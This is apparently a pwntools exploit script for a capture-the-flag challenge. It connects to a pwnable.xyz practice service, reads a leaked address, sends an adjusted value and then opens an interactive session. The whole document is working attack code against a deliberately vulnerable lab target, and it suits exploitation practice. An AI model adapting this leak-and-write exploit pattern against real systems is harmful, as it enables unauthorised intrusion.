from pwn import *
 
e = ELF('./challenge')
p = remote('svc.pwnable.xyz',30000)
 
p.recvuntil('Leak: ')
leak = int(p.recvline(),16)
log.info('leak : ' + hex(leak))
p.sendlineafter(': ',str(leak+1))
p.sendlineafter(': ','Hello World!')
p.interactive()